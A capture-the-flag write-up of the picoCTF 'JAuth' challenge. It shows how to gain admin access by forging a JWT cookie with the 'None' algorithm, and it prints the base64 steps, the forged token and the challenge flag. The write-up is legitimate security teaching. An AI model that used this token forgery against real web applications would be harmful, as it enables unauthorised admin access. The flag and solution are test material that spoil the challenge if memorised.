# JAuth
Author: dch0017

## Challenge Description
Most web application developers use third party components without testing their security. Some of the past affected companies are:
Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?
The website is running here. Can you become an admin?
You can login as test with the password Test123! to get started.

## Website
Let's pull up the site and here is what we get:</br>
![website](./website.png)
</br>

Plain log in page, inspect the source html and nothing immediately sticks out. Let's go ahead and try to log in using the provided credentials.</br>
![logged in](./loggedin.png)
</br>

## Check the traffic
Nothing special here either, we are on a new subdirectory ```/private``` but I don't see any thing sticking out to me. Let's open up burpsuite and let's see what actually happens when we log in.

We see two requests, a POST request to ```/auth``` which supplies our username and password, and in turn we get an authentication cookie back. The cookie is then supplied in a GET request to ```/private``` to bring us to the page above.

## JWT Time
Here is our encoded cookie:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjc0MjI1NzY4NDc3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0Ljc1IFNhZmFyaS81MzcuMzYiLCJyb2xlIjoidXNlciIsImlhdCI6MTY3NDIyNTc2OH0.zcPLxtC2W8qzN5Y_fjLt_q_N6xzVP2R7eVZjvve7_v0
```

Let's decode that and to see more info, I used [jwt.io](https://jwt.io) for this.</br>
![decoded cookie](./decoded_cookie.png)
</br>

## Slight modifications
A good article on JWT vulnerabilities is here on [Invicti](https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/).

Right off the bat, I want to go ahead and try to change that ```role``` portion of the from ```user``` to ```admin``` and see what I get.

Here is my new cookie:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjc0MjI1NzY4NDc3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0Ljc1IFNhZmFyaS81MzcuMzYiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzQyMjU3Njh9.gXYa8s-eRqOMLmJgQvT7SovirmOi6q3SZ6TLu5V-VZQ
```

and when I plug that into burpsuite and pass that along I get....</br>
![authentication failed](./authfailed.png)
</br>

## None Algorithm
Changing the ```alg``` key from HS256 to ```None``` totally skips the signature checking (if the application accepts that.) I doubt you would find this too often in the wild, but it doesn't hurt to try.

We can generate that fairly quickly using our console and the ```base64``` command but I just did it on [cyber chef](https://gchq.github.io/CyberChef/)

## Chef in the Kitchen
Put our ```header``` on the input side with ```To Base64``` in the recipe slot
```
{
  "typ": "JWT",
  "alg": "None"
}
```
Which gives us:
```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0=
```

Then we put our ```payload``` on the input side ```To Base64``` in the recipe slot
```
{
  "auth": 1674229308461,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
  "role": "admin",
  "iat": 1674229308
}
```


Which gives us:
```
ewogICJhdXRoIjogMTY3NDIyOTMwODQ2MSwKICAiYWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuNzUgU2FmYXJpLzUzNy4zNiIsCiAgInJvbGUiOiAiYWRtaW4iLAogICJpYXQiOiAxNjc0MjI5MzA4Cn0=
```

## Getting the forged JWT
Now let's combine those together, and drop the ```=``` and replace with a ```.```. So our forged JWT would end up looking like:
```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0.ewogICJhdXRoIjogMTY3NDIyOTMwODQ2MSwKICAiYWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuNzUgU2FmYXJpLzUzNy4zNiIsCiAgInJvbGUiOiAiYWRtaW4iLAogICJpYXQiOiAxNjc0MjI5MzA4Cn0.
```
Now plugging in that forged JWT during the GET request to  ```/private``` path should give us more information.

## Success
Finally we are greeted with a success page and our token. </br>
![success](./success.png)
</br>

## Flag
```
picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
```
